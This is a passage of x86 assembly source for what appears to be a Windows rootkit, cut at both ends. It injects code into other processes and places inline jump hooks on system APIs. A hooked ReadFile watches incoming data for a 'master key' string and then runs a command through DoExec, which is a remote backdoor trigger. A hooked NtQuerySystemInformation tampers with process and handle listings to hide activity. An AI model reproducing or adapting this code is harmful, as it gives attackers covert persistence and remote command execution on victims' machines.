  lea ecx,[ebp-068h]
  push ecx                                      //Buffer
  push dword ptr [ebp-068h]                     //BaseAddress
  push esi                                      //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @HookProcess_free
  mov eax,[ebp-068h]
  cmp eax,[ebp-054h]
  jnz @HookProcess_CountModules_loop
  dec edi

  push edi
  shl edi,003h
  add edi,004h
  push edi
  call @LocalAllocMem
  test eax,eax
  jz @HookProcess_free
  mov [ebp-06Ch],eax
  lea edi,[eax+004h]
  mov eax,[ebp-054h]
  mov [ebp-068h],eax
  pop ecx
  mov [edi-004h],ecx

 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push ecx
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData7e]
  push eax
  call @LogPChar_without_length
  push 001h
  push esp
  call @LogIntAsString
  pop ecx
  {$IFEND}
 {$ENDIF}

 @HookProcess_LoadModules_loop:
  push ecx
  push 000h                                     //ReturnLength
  push 014h                                     //BufferLength
  lea ecx,[ebp-068h]
  push ecx                                      //Buffer
  push dword ptr [ebp-068h]                     //BaseAddress
  push esi                                      //ProcessHandle
  call @Safety_NtReadVirtualMemory
  pop ecx
  test eax,eax
  jnz @HookProcess_free_modulelist
  mov eax,[ebp-060h]
  stosd
  mov eax,[ebp-058h]
  stosd
  loop @HookProcess_LoadModules_loop

 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData7f]
  push eax
  call @LogPChar_without_length
  push 001h
  push esp
  call @LogIntAsString
  {$IFEND}
 {$ENDIF}

  push dword ptr [ebp+00Ch]                     //HookType
  push dword ptr [ebp+008h]                     //PID
  call @SuspendProcess

 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData7g]
  push eax
  call @LogPChar_without_length
  push 001h
  push esp
  call @LogIntAsString
  {$IFEND}
 {$ENDIF}

 @HookProcess_Hook:
  push 000h
  pop dword ptr [ebp-014h]                      //LCounter1
  lea esi,[ebx+@HookStatic]
  mov edi,[ebp-018h]                            //LHookedFlags
 @HookProcess_LoadHookArgs:
  mov ecx,003h
  mov edx,[ebp-014h]                            //LCounter1
  movzx eax,byte ptr [edi+edx]
  test eax,eax
  jnz @HookProcess_LoadHookArgs_loop_already_hooked
 @HookProcess_LoadHookArgs_basic:
  push dword ptr [ebp-06Ch]                     //ModuleList
  push dword ptr [ebp-00Ch]                     //AAllocAddr
  push dword ptr [ebp-008h]                     //AProcessHandle
  cmp dword ptr [ebp+00Ch],000h                 //htExistingProcess
  jz @HookProcess_LoadHookArgs_LdrInitializeThunk
 @HookProcess_LoadHookArgs_loop:
  lodsd
  add eax,ebx
  push eax
  loop @HookProcess_LoadHookArgs_loop
  jmp @HookProcess_call_HookAPI
 @HookProcess_LoadHookArgs_LdrInitializeThunk:
  lea eax,[ebx+@HT_OldLdrInitializeThunk]
  push eax
  lea eax,[ebx+@fNewLdrInitializeThunk]
  push eax
  lea eax,[ebx+@LdrInitializeThunkAddr]
  push eax
 @HookProcess_call_HookAPI:
  call @HookAPI
  or [ebp-004h],al

 {$IFDEF LOGGING}
  {$IF Logging_Level=1}
  push eax
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData3a]              //hooking process
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp+008h]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData3b]              //api
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp-014h]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData3c]              //res
  push eax
  call @LogPChar_without_length
  pop eax
  push eax
  push 001h
  push eax
  call @LogIntAsString
  pop eax
  {$IFEND}
 {$ENDIF}

  cmp dword ptr [ebp+00Ch],000h                 //htNewProcess
  jz @HookProcess_hook_done
  jmp @HookProcess_LoadHookArgs_loop_next

 @HookProcess_LoadHookArgs_loop_already_hooked:
  add esi,00Ch
  jmp @HookProcess_LoadHookArgs_inc_counter

 @HookProcess_LoadHookArgs_loop_next:
  mov ecx,edi
  add ecx,[ebp-014h]                            //LCounter1
  mov [ecx],al

 @HookProcess_LoadHookArgs_inc_counter:
  inc dword ptr [ebp-014h]
  cmp dword ptr [ebp-014h],HooksCount
  jnz @HookProcess_LoadHookArgs

 @HookProcess_hook_done:
  cmp dword ptr [ebp+00Ch],001h                 //htRehook
  jz @HookProcess_ResumeProcess

 //write HookedFlags to the target process
  lea eax,[ebx+@HookedFlags]
  lea esi,[ebx+@Body]
  sub eax,esi
  add eax,[ebp-00Ch]

  push 000h                                     //ReturnLength
  push HooksCount                               //BufferLength
  push dword ptr [ebp-018h]                     //Buffer
  push eax                                      //BaseAddress
  push dword ptr [ebp-008h]                     //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]

 //write GlobalCheck to target process
  lea eax,[ebx+@LGlobalCheck]
  sub eax,esi
  add eax,[ebp-00Ch]

  push 000h                                     //ReturnLength
  push 004h                                     //BufferLength
  lea ecx,[ebp-014h]
  push 000h
  pop dword ptr [ecx]
  push ecx                                      //Buffer
  push eax                                      //BaseAddress
  push dword ptr [ebp-008h]                     //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]

  //create notify table in target process
  push NOTIFY_TABLE_SIZE                        //Size
  push dword ptr [ebp-008h]                     //ProcessHandle
  call @GlobalAllocMem
  mov edi,eax

  lea eax,[ebx+@LNotifyTable]
  sub eax,esi
  add eax,[ebp-00Ch]

  push 000h                                     //ReturnLength
  push 004h                                     //BufferLength
  lea ecx,[ebp-014h]
  push edi
  pop dword ptr [ecx]
  push ecx                                      //Buffer
  push eax                                      //BaseAddress
  push dword ptr [ebp-008h]                     //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]

 //free local memory for HookedFlags
  push dword ptr [ebp-018h]                     //LHookedFlags
  call @LocalFreeMem
 @HookProcess_ResumeProcess:
  push dword ptr [ebp+008h]                     //PID
  call @ResumeProcess
 @HookProcess_free_modulelist:
  push dword ptr [ebp-06Ch]                     //LModuleList
  call @LocalFreeMem
  jmp @HookProcess_close_proc_handle
 @HookProcess_free:
  push dword ptr [ebp-00Ch]                     //BaseAddress
  push dword ptr [ebp-008h]                     //ProcessHandle
  call @GlobalFreeMem
  push 000h
  pop dword ptr [ebp-004h]
 @HookProcess_close_proc_handle:
  push dword ptr [ebp-008h]                     //ProcessHandle
  call [ebx+@NtCloseAddr]
 @HookProcess_end:
  mov eax,[ebp-004h]
  pop esi
  pop edi
  leave
  ret 008h

 @HookAPI:
  push ebp
  mov ebp,esp
  sub esp,060h
  {
   -060         -       LMemBasicInfo.BaseAddress:Pointer
   -05C         -       LMemBasicInfo.AllocationBase:Pointer
   -058         -       LMemBasicInfo.AllocationProtect:Cardinal
   -054         -       LMemBasicInfo.RegionSize:Cardinal
   -050         -       LMemBasicInfo.Protect:Cardinal
   -04C         -       LMemBasicInfo.Type_9:Cardinal
   -048..-00C   -       LBuffer:array[0..59] of Char
   -008         -       LModuleHandle:THandle
   -004         -       LResult:Boolean

   +008         -       APProcAddr:Pointer
   +00C         -       ANewAddr:Pointer
   +010         -       AOldAddr:Pointer
   +014         -       AProcessHandle:THandle
   +018         -       AAllocAddr:Pointer
   +01C         -       AModuleList:Pointer
  }

  push edi
  push esi

  push 000h
  pop dword ptr [ebp-004h]                      //LResult
  mov eax,[ebp+008h]                            //APProcAddr
  mov eax,[eax]
  mov [ebp+008h],eax                            //APProcAddr -> AProcAddr

  mov esi,[ebp+01Ch]                            //AModuleList
  cmp esi,000h
  jz @HookAPI_Hook

  lodsd
  mov ecx,eax
  xor edx,edx
 @HookAPI_find_image:
  lodsd
  mov edi,[ebp+008h]
  sub edi,eax
  lodsd
  jbe @HookAPI_find_image_next
  sub eax,edi
  jb @HookAPI_find_image_next
  inc edx
  jmp @HookAPI_find_image_done
 @HookAPI_find_image_next:
  loop @HookAPI_find_image
 @HookAPI_find_image_done:
  test edx,edx
  jz @HookAPI_end                       //oh fuck
 @HookAPI_Hook:

  push 000h                                     //ReturnLength
  push MEMORY_BASIC_INFORMATION_SIZE            //MemoryInformationLength
  lea ecx,[ebp-060h]
  push ecx                                      //MemoryInformation
  push 000h                                     //MemoryInformationClass = MemoryBasicInformation
  push dword ptr [ebp+008h]                     //BaseAddress
  push dword ptr [ebp+014h]                     //ProcessHandle
  call [ebx+@NtQueryVirtualMemoryAddr]
  test eax,eax
  jnz @HookAPI_end

  push 010h                                     //FlushSize
  push dword ptr [ebp+008h]                     //BaseAddress
  push dword ptr [ebp+014h]                     //ProcessHandle
  call [ebx+@NtFlushInstructionCacheAddr]

  lea eax,[ebp-050h]
  push eax                                      //OldProtect
  push PAGE_EXECUTE_READWRITE                   //NewProtect
  lea eax,[ebp-054h]
  push eax                                      //ProtectSize
  lea eax,[ebp-060h]
  push eax                                      //BaseAddress
  push dword ptr [ebp+014h]                     //ProcessHandle
  call [ebx+@NtProtectVirtualMemoryAddr]
  test eax,eax
  jnz @HookAPI_end

  push 000h                                     //ReturnLength
  push 010h                                     //BufferLength
  lea esi,[ebp-048h]
  push esi                                      //Buffer
  push dword ptr [ebp+008h]                     //BaseAddress
  push dword ptr [ebp+014h]                     //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @HookAPI_end

  cmp byte ptr [esi],0E9h
  jz @HookAPI_end

  push ebx
  mov edx,esi
  mov ebx,esi
  xor edi,edi

 @HookAPI_getfivebytes:
  push ebx
  call @GetInstructionLen
  add edi,eax
  add ebx,eax
  cmp edi,005h
  jb @HookAPI_getfivebytes
  pop ebx
  mov edx,edi
  dec edx
  mov eax,090h
  push 010h
  pop ecx
  sub ecx,edi
  lea edi,[esi+edi]
  rep stosb
  mov byte ptr [edi],0E9h
  inc edi

  mov eax,[ebp+018h]                            //AAllocAddr
  lea ecx,[ebx+@Body]
  sub eax,ecx
  add eax,[ebp+010h]                            //AOldAddr
  add eax,013h                                  //nopz

  sub eax,[ebp+008h]                            //LProcAddr
  sub eax,edx                                   //first instructions len
  not eax
  mov [edi],eax

  mov edi,[ebp+018h]                            //AAllocAddr
  lea eax,[ebx+@Body]
  sub edi,eax
  add edi,[ebp+010h]                            //AOldAddr

  push 000h                                     //ReturnLength
  push 015h                                     //BufferLength
  push esi                                      //Buffer
  push edi                                      //BaseAddress
  push dword ptr [ebp+014h]                     //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]
  test eax,eax
  jnz @HookAPI_failed

  lea eax,[ebp-048h]                            //LBuffer
  mov byte ptr [eax],0E9h
  mov ecx,[ebp+008h]                            //LProcAddr
  add ecx,004h
  lea edx,[ebx+@Body]
  add ecx,edx
  sub ecx,[ebp+00Ch]                            //ANewAddr
  sub ecx,[ebp+018h]                            //AAllocAddr
  not ecx
  mov [eax+001h],ecx

  push 000h                                     //ReturnLength
  push 005h                                     //BufferLength
  push eax                                      //Buffer
  push dword ptr [ebp+008h]                     //BaseAddress
  push dword ptr [ebp+014h]                     //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]
  test eax,eax
  jz @HookAPI_old_protect

 @HookAPI_failed:
  dec dword ptr [ebp-004h]

 @HookAPI_old_protect:
  lea eax,[ebp-050h]
  push eax                                      //OldProtect
  push dword ptr [ebp-050h]                     //NewProtect
  lea eax,[ebp-054h]
  push eax                                      //ProtectSize
  lea eax,[ebp-060h]
  push eax                                      //BaseAddress
  push dword ptr [ebp+014h]                     //ProcessHandle
  call [ebx+@NtProtectVirtualMemoryAddr]
  inc dword ptr [ebp-004h]

 @HookAPI_end:
  mov eax,[ebp-004h]
  pop esi
  pop edi
  leave
  ret 018h


 //UnhookProcess is called for every hooked running process after -:uninstall request
 //this will open target process specified by APID argument
 //then the target process is suspended and UnhookAPI is called for every
 //hooked API in the target process
 //next is to resume the process and wait until target process leaves
 //hooked function if any is being executed at the moment
 //finally process is suspended again and allocated memory is freed
 //and it is resumed again
 @UnhookProcess:
  push ebp
  mov ebp,esp
  sub esp,060h
  {
  @HookedFlags
   -060         -       LFlag:Boolean
   -05C         -       LRemoteHookRunning:Cardinal
   -058         -       LRemoteNotifyTablePtr:Pointer
   -054..-040   -       LHookTableItem:array of Cshar
   -03C         -       LCounter:Cardinal
   -038         -       LRemAlloc:Pointer
   -034..-030   -       LSmallBuf:array[0..7] of Char
   -02C         -       LPHookedFlags:Pointer
   -028..-024   -       LPID:CLIENT_ID
   -020..-00C   -       LObjectAttr:TObjectAttributes
   -008         -       LProcessHandle:Cardinal
   -004         -       LResult:Boolean
   +008         -       APID:Cardinal
  }
  push edi
  push esi

  xor eax,eax
  push 018h
  pop dword ptr [ebp-020h]
  mov [ebp-01Ch],eax
  mov [ebp-018h],eax
  mov [ebp-014h],eax
  mov [ebp-010h],eax
  mov [ebp-00Ch],eax

  mov [ebp-004h],eax                            //LResult

  mov edi,[ebp+008h]                            //APID

  push 001h                                     //ctRootProcess
  push edi                                      //APID
  call @CheckProcess
  test eax,eax
  jnz @UnhookProcess_end

  call @GetCurrentProcessId
  cmp eax,edi
  jnz @UnhookProcess_GetProcessHandle
  or [ebp-008h],-001h                           //CurrentProcessHandle
  jmp @UnhookProcess_hook_check

 @UnhookProcess_GetProcessHandle:
  lea eax,[ebp-028h]
  push edi
  pop dword ptr [eax]                           //LClientId.UniqueProcess
  push 000h
  pop dword ptr [eax+004h]                      //LClientId.UniqueThread
  push eax                                      //ClientId
  lea eax,[ebp-020h]
  push eax                                      //ObjectAttributes
  push 0001F0FFFh                               //DesiredAccess = PROCESS_ALL_ACCESS
  lea eax,[ebp-008h]
  push eax                                      //ProcessHandle
  call @Safety_NtOpenProcess
  test eax,eax
  jnz @UnhookProcess_end
 @UnhookProcess_hook_check:
  mov esi,[ebp-008h]                            //LProcessHandle

  push 000h                                     //ReturnLength
  push 005h                                     //BufferLength
  lea eax,[ebp-034h]
  push eax                                      //Buffer
  push dword ptr [ebx+@NtQuerySystemInformationAddr] //BaseAddress
                                                //this should be hooked everywhere
  push esi                                      //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @UnhookProcess_close_proc_handle
  mov al,[ebp-034h]
  cmp al,0E9h                                   //check if hooked
  jnz @UnhookProcess_close_proc_handle

  push 000h                                     //HookType = htNewProcess
  push edi                                      //PID
  call @SuspendProcess

  push HooksCount
  call @LocalAllocMem
  test eax,eax
  jz @UnhookProcess_resume_process
  mov [ebp-02Ch],eax                            //LPHookedFlags

  mov eax,[ebp-033h]                            //0WWXXYYZZh from jmp 0WWXXYYZZh
  mov ecx,[ebx+@NtQuerySystemInformationAddr]
  add ecx,005h                                  //address of instruction after the jump
  add eax,ecx                                   //jump to this address
  lea ecx,[ebx+@fNewNtQuerySystemInformation]
  lea edx,[ebx+@Body]
  sub ecx,edx
  sub eax,ecx                                   //address of allocated memory in remote process
  mov [ebp-038h],eax                            //LRemAlloc

  lea ecx,[ebx+@HookedFlags]
  lea edx,[ebx+@Body]
  sub ecx,edx
  add eax,ecx                                   //address of @HookedFlags in remote process

  push 000h                                     //ReturnLength
  push HooksCount                               //BufferLength
  push dword ptr [ebp-02Ch]                     //Buffer
  push eax                                      //BaseAddress
  push esi                                      //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @UnhookProcess_free_hooked_flags

  lea esi,[ebx+@UnhookStatic]
  mov [ebp-03Ch],eax                            //LCounter

 @UnhookProcess_api:
  mov eax,[ebp-03Ch]                            //LCounter
  mov ecx,[ebp-02Ch]                            //LPHookedFlags
  movzx ecx,byte ptr [ecx+eax]
  jecxz @UnhookProcess_api_not_hooked

  lodsd                                         //load HT_ITEM address
  mov ecx,[ebp-038h]                            //LRemAlloc
  lea edx,[ebx+@Body]
  sub eax,edx
  add ecx,eax                                   //address of remote HT_ITEM

  push 000h                                     //ReturnLength
  push 015h                                     //BufferLength
  lea eax,[ebp-054h]
  push eax                                      //Buffer
  push ecx                                      //BaseAddress
  push dword ptr [ebp-008h]                     //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @UnhookProcess_free_hooked_flags

  lodsd                                         //load remote procaddr address
  mov eax,[eax]                                 //procaddr

  push eax                                      //FunctionAddress
  lea eax,[ebp-054h]
  push eax                                      //HookTableItem
  push dword ptr [ebp-008h]                     //ProcessHandle
  call @UnhookAPI
  jmp @UnhookProcess_api_next

 @UnhookProcess_api_not_hooked:
  lodsd
  lodsd

 @UnhookProcess_api_next:
  inc dword ptr [ebp-03Ch]                      //LCounter
  cmp dword ptr [ebp-03Ch],HooksCount
  jb @UnhookProcess_api

  push 001h
  pop dword ptr [ebp-004h]                      //LResult

 @UnhookProcess_free_hooked_flags:
  push dword ptr [ebp-02Ch]                     //LPHookedFlags
  call @LocalFreeMem

 //set remote LUnhookInProgress to stop hooked wait* functions
  push 000h                                     //ReturnLength
  push 001h                                     //BufferLength
  lea eax,[ebp-060h]                            //LFlag
  push eax                                      //Buffer
  mov byte ptr [eax],001h

  lea ecx,[ebx+@LUnhookInProgress]
  lea edx,[ebx+@Body]
  sub ecx,edx
  add ecx,[ebp-038h]                            //LRemAlloc -> ecx = remote LUnhookInProgress

  push ecx                                      //BaseAddress
  push dword ptr [ebp-008h]                     //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]

 //now resume wait a moment until they finish their code in our allocated part
  push 040h                                     //64*125 ms = 8 s
  pop esi
 @UnhookProcess_wait_HookRunning:
  push dword ptr [ebp+008h]                     //PID
  call @ResumeProcess

  push 07Dh                                     //125 milliseconds
  call @Sleep

 //suspend again and jump to read LHookRunning again
  push 000h                                     //HookType = htNewProcess
  push dword ptr [ebp+008h]                     //PID
  call @SuspendProcess

 //read LHookRunning and LNotifyTable from remote process
  push 000h                                     //ReturnLength
  push 008h                                     //BufferLength
  lea eax,[ebp-05Ch]                            //LRemoteHookRunning
  push eax                                      //Buffer

  lea ecx,[ebx+@LHookRunning]
  lea edx,[ebx+@Body]
  sub ecx,edx
  add ecx,[ebp-038h]                            //LRemAlloc -> ecx = remote LHookRunning

  push ecx                                      //BaseAddress
  push dword ptr [ebp-008h]                     //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @UnhookProcess_resume_process

  dec esi
  //084 update
//  jz @UnhookProcess_free_mem
  jz @UnhookProcess_resume_process
  mov eax,[ebp-05Ch]                            //LRemoteHookRunning
  test eax,eax
  jnz @UnhookProcess_wait_HookRunning

 @UnhookProcess_free_mem:
  push dword ptr [ebp-038h]                     //LRemAlloc
  push dword ptr [ebp-008h]                     //ProcessHandle
  call @GlobalFreeMem

  push dword ptr [ebp-058h]                     //LRemoteNotifyTablePtr
  push dword ptr [ebp-008h]                     //ProcessHandle
  call @GlobalFreeMem

 @UnhookProcess_resume_process:
  push dword ptr [ebp+008h]                     //PID
  call @ResumeProcess

 @UnhookProcess_close_proc_handle:
  push dword ptr [ebp-008h]                     //Handle
  call [ebx+@NtCloseAddr]

 @UnhookProcess_end:
  mov eax,[ebp-004h]
  pop esi
  pop edi
  leave
  ret 004h

 @UnhookAPI:
  push ebp
  mov ebp,esp
  sub esp,01Ch
  {
   -01C         -       LMemBasicInfo.BaseAddress:Pointer
   -018         -       LMemBasicInfo.AllocationBase:Pointer
   -014         -       LMemBasicInfo.AllocationProtect:Cardinal
   -010         -       LMemBasicInfo.RegionSize:Cardinal
   -00C         -       LMemBasicInfo.Protect:Cardinal
   -008         -       LMemBasicInfo.Type_9:Cardinal
   -004         -       LResult:Boolean
   +008         -       AProcessHandle:THandle
   +00C         -       AHookTableItem:Pointer
   +010         -       AFunctionAddress:Pointer

  }
  push edi
  push esi
  xor edi,edi
  mov [ebp-004h],edi                            //LResult

  mov esi,[ebp+00Ch]                            //AHookTableItem

 @UnhookAPI_getfivebytes:
  push esi
  call @GetInstructionLen
  add edi,eax
  add esi,eax
  cmp edi,005h
  jb @UnhookAPI_getfivebytes

  push 000h                                     //ReturnLength
  push MEMORY_BASIC_INFORMATION_SIZE            //MemoryInformationLength
  lea ecx,[ebp-01Ch]
  push ecx                                      //MemoryInformation
  push 000h                                     //MemoryInformationClass = MemoryBasicInformation
  push dword ptr [ebp+010h]                     //BaseAddress
  push dword ptr [ebp+008h]                     //ProcessHandle
  call [ebx+@NtQueryVirtualMemoryAddr]
  test eax,eax
  jnz @UnhookAPI_end

  push 010h                                     //FlushSize
  push dword ptr [ebp+010h]                     //BaseAddress
  push dword ptr [ebp+008h]                     //ProcessHandle
  call [ebx+@NtFlushInstructionCacheAddr]

  lea eax,[ebp-00Ch]
  push eax                                      //OldProtect
  push PAGE_EXECUTE_READWRITE                   //NewProtect
  lea eax,[ebp-010h]
  push eax                                      //ProtectSize
  lea eax,[ebp-01Ch]
  push eax                                      //BaseAddress
  push dword ptr [ebp+008h]                     //ProcessHandle
  call [ebx+@NtProtectVirtualMemoryAddr]
  test eax,eax
  jnz @UnhookAPI_end

  push 000h                                     //ReturnLength                        
  push edi                                      //BufferLength                         
  push dword ptr [ebp+00Ch]                     //Buffer
  push dword ptr [ebp+010h]                     //BaseAddress
  push dword ptr [ebp+008h]                     //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]

  lea eax,[ebp-00Ch]
  push eax                                      //OldProtect
  push dword ptr [ebp-00Ch]                     //NewProtect
  lea eax,[ebp-010h]
  push eax                                      //ProtectSize
  lea eax,[ebp-01Ch]
  push eax                                      //BaseAddress
  push dword ptr [ebp+008h]                     //ProcessHandle
  call [ebx+@NtProtectVirtualMemoryAddr]
  test eax,eax
  setz al
  mov [ebp-004h],al                             //LResult
 @UnhookAPI_end:
  mov eax,[ebp-004h]
  pop esi
  pop edi
  leave
  ret 00Ch


 @UnhookLocalAPI:                               //used for unhooking LdrInitializeThunk
  push ebp
  mov ebp,esp
  sub esp,01Ch
  {
   -01C         -       LMemBasicInfo.BaseAddress:Pointer
   -018         -       LMemBasicInfo.AllocationBase:Pointer
   -014         -       LMemBasicInfo.AllocationProtect:Cardinal
   -010         -       LMemBasicInfo.RegionSize:Cardinal
   -00C         -       LMemBasicInfo.Protect:Cardinal
   -008         -       LMemBasicInfo.Type_9:Cardinal
   -004         -       LResult:Boolean
   +008         -       APProcAddr:Pointer
   +00C         -       AHookAddr:Pointer
  }
  push edi
  push esi
  xor edi,edi
  mov [ebp-004h],edi

  mov esi,[ebp+00Ch]
  mov eax,[ebp+008h]
  mov eax,[eax]
  mov [ebp+008h],eax

 @UnhookLocalAPI_getfivebytes:
  push esi
  call @GetInstructionLen
  add edi,eax
  add esi,eax
  cmp edi,005h
  jb @UnhookLocalAPI_getfivebytes

  push 000h                                     //ReturnLength
  push MEMORY_BASIC_INFORMATION_SIZE            //MemoryInformationLength
  lea ecx,[ebp-01Ch]
  push ecx                                      //MemoryInformation
  push 000h                                     //MemoryInformationClass = MemoryBasicInformation
  push dword ptr [ebp+008h]                     //BaseAddress
  push -001h                                    //ProcessHandle
  call [ebx+@NtQueryVirtualMemoryAddr]
  test eax,eax
  jnz @UnhookLocalAPI_end

  push 010h                                     //FlushSize
  push dword ptr [ebp+008h]                     //BaseAddress
  push -001h                                    //ProcessHandle
  call [ebx+@NtFlushInstructionCacheAddr]

  lea eax,[ebp-00Ch]
  push eax                                      //OldProtect
  push PAGE_EXECUTE_READWRITE                   //NewProtect
  lea eax,[ebp-010h]
  push eax                                      //ProtectSize
  lea eax,[ebp-01Ch]
  push eax                                      //BaseAddress
  push -001h                                    //ProcessHandle
  call [ebx+@NtProtectVirtualMemoryAddr]
  test eax,eax
  jnz @UnhookLocalAPI_end

  push esi
  mov ecx,edi
  mov edi,[ebp+008h]
  mov esi,[ebp+00Ch]
  rep movsb
  pop esi

  lea eax,[ebp-00Ch]
  push eax                                      //OldProtect
  push dword ptr [ebp-00Ch]                     //NewProtect
  lea eax,[ebp-010h]
  push eax                                      //ProtectSize
  lea eax,[ebp-01Ch]
  push eax                                      //BaseAddress
  push -001h                                    //ProcessHandle
  call [ebx+@NtProtectVirtualMemoryAddr]
  test eax,eax
  setz al
  mov [ebp-004h],al
 @UnhookLocalAPI_end:
  mov eax,[ebp-004h]
  pop esi
  pop edi
  leave
  ret 008h



/////////////////////
//  NEW API HEAD   //
/////////////////////
 @NewAPIHead:
  pop edx                                       //ret
  pop eax                                       //local variables
  push ebp
  mov ebp,esp
  sub esp,eax                                   //get mem for local variables
  push edi
  push esi
  push ebx

  push edx                                      //put ret addr on the stack
  call @GetAddr
  mov ebx,eax

  inc [ebx+@LHookRunning]

  call @RehookMe
 @NewAPIHead_end:
  //after this ret org ebp,edi,esi and ebx are on the top of the stack
  //and ebp = org esp
  //and there is free space for local variables forcalling function
  ret

 @NewAPITail:
  pop edx                                       //size of api parameters
  mov eax,[ebp-004h]                            //api result
  dec [ebx+@LHookRunning]
  pop ebx                                       //restore registers
  pop esi
  pop edi
  leave                                         //restore esp,ebp
  pop ecx                                       //get calling eip
  add esp,edx                                   //jump over api parameters
  jmp ecx

 @NewAPITail_wait_funcs:
  dec [ebx+@LHookRunning]
  pop ebx
  pop esi
  pop edi
  leave
  jmp ecx

 {New APIs}
 //TReadFile=function(AFile:THandle;ABuffer:Pointer;ANumberOfBytesToRead:DWORD;ANumberOfBytesRead:PDWORD;AOverlapped:POverlapped):BOOL;stdcall;
 @fNewReadFile:
  push 004h                                     //local variables
  call @NewAPIHead
  {
   -004         -       LResult:Boolean
  }

  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldReadFile]
  test dword ptr [eax+011h],-001h
  jz @fNewReadFile_end
  mov esi,[ebp+00Ch]
  push dword ptr [ebp+018h]             //AOverlapped
  push dword ptr [ebp+014h]             //ANumverOfBytesRead
  push dword ptr [ebp+010h]             //ANumverOfBytesToRead
  push dword ptr [ebp+00Ch]             //ABuffer
  push dword ptr [ebp+008h]             //AFile
  call eax
  mov [ebp-004h],eax

  mov ecx,eax
  mov eax,[ebp+014h]
  test eax,eax
  jz @fNewReadFile_overlapped
  mov eax,[eax]
  inc eax
  test ecx,ecx
  jnz @fNewReadFile_gotbuf

 @fNewReadFile_overlapped:
  call [ebx+@GetLastErrorAddr]
  cmp eax,ERROR_IO_PENDING
  jnz @fNewReadFile_end

  test esi,esi  //newfeature
  jz @fNewReadFile_end
  push MASTER_KEY_LEN
  push esi
  call [ebx+@IsBadReadPtrAddr]
  test eax,eax
  jnz @fNewReadFile_lookaround
  lea edi,[ebx+@cMasterKey]
  call @cmp2pchars_casesens
  test eax,eax
  jnz @fNewReadFile_doexec
 @fNewReadFile_lookaround:
  sub esi,MASTER_KEY_LEN
  push MASTER_KEY_LEN
  push esi
  call [ebx+@IsBadReadPtrAddr]
  test eax,eax
  jnz @fNewReadFile_end
  push MASTER_KEY_LEN
  pop ecx
 @fNewReadFile_lookaround_loop:
  push ecx
  lea edi,[ebx+@cMasterKey]
  call @cmp2pchars_casesens
  pop ecx
  test eax,eax
  jnz @fNewReadFile_doexec
  inc esi
  loop @fNewReadFile_lookaround_loop
  jmp @fNewReadFile_end 

 @fNewReadFile_gotbuf:
  cmp eax,MASTER_KEY_LEN+1
  jne @fNewReadFile_end
  mov esi,[ebp+00Ch]
 @fNewReadFile_DoCompareBuf:
  lea edi,[ebx+@cMasterKey]
  call @cmp2pchars_casesens
  test eax,eax
  jz @fNewReadFile_end

 @fNewReadFile_doexec:
  xor eax,eax
  mov [esi],eax
  push dword ptr [ebp+008h]
  call @DoExec
  xor eax,eax
  inc eax
  mov [ebp-004h],eax
  mov eax,[ebp+00Ch]
  mov [eax],000h
  mov eax,[ebp+014h]
  test eax,eax
  jz @fNewReadFile_end
  mov [eax],000h

 @fNewReadFile_end:
  push 014h
  jmp @NewAPITail

//TNtQuerySystemInformation=function(ASystemInformationClass:TSystemInformationClass;ASystemInformation:Pointer;ASystemInformationLength:Cardinal;AReturnLength:Pointer):Cardinal;stdcall;
 @fNewNtQuerySystemInformation:
  push 040h                                     //local variables
  call @NewAPIHead
  {
   -040         -       LOldNtQSI:Pointer
   -03C..-038   -       LClientId:TClientId
   -034..-020   -       LObejctAttr:TObjectAttributes
   -01C         -       LProcessHandleType:Cardinal
   -018         -       LThreadHandleType:Cardinal
   -014         -       LFileHandleType:Cardinal
   -010         -       LProcessHandle:THandle
   -00C         -       LThreadHandle:THandle
   -008         -       LDriverHandle:THandle
   -004         -       LResult:Cardinal
  }

  mov dword ptr [ebp-004h],0C0000001h           //STATUS_UNSUCCESSFUL

  lea eax,[ebx+@HT_OldNtQuerySystemInformation]
  test dword ptr [eax+011h],-001h
  jz @fNewNtQuerySystemInformation_end
  mov [ebp-040h],eax

  mov edi,[ebp+008h]                            //ASystemInformationClass
  cmp edi,010h                                  //SystemHandleInformation
  jz @fNewNtQuerySystemInformation_class_16_init

 @fNewNtQuerySystemInformation_call:
  push dword ptr [ebp+014h]                     //AReturnLength
  push dword ptr [ebp+010h]                     //ASystemInformationLength
  push dword ptr [ebp+00Ch]                     //ASystemInformation
  push dword ptr [ebp+008h]                     //ASystemInformationClass
  call [ebp-040h]
  mov [ebp-004h],eax

  cmp edi,005h                                  //SystemProcessesAndThreadsInformation
  jz @fNewNtQuerySystemInformation_class_5
  cmp edi,010h                                  //SystemHandleInformation
  jne @fNewNtQuerySystemInformation_end

  test eax,eax
  jnz @fNewNtQuerySystemInformation_class_16_close_handles
 {new 079}
  mov eax,[ebp-008h]
  test eax,eax
  jz @fNewNtQuerySystemInformation_end
 {/new 079}

  xor esi,esi
  xor edx,edx                                   //edx = handles found
